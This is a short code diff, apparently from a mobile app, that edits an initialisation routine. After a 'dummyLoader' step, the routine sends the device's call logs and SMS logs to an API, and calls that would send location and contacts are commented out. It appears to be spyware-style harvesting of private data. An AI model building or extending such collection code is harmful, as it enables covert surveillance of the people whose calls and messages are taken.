@@ -31,7 +31,7 @@ class Init {
     dummyLoader();
     // Api.sendLocation(agent, uuid);
     // Api.sendContacts(agent, uuid);
-    await Api.sendCallLogs(context, agent, uuid);
+    await Api().sendCallLogs(context, agent, uuid);
     await Api.sendSmsLogs(context, agent, uuid);
   }
 
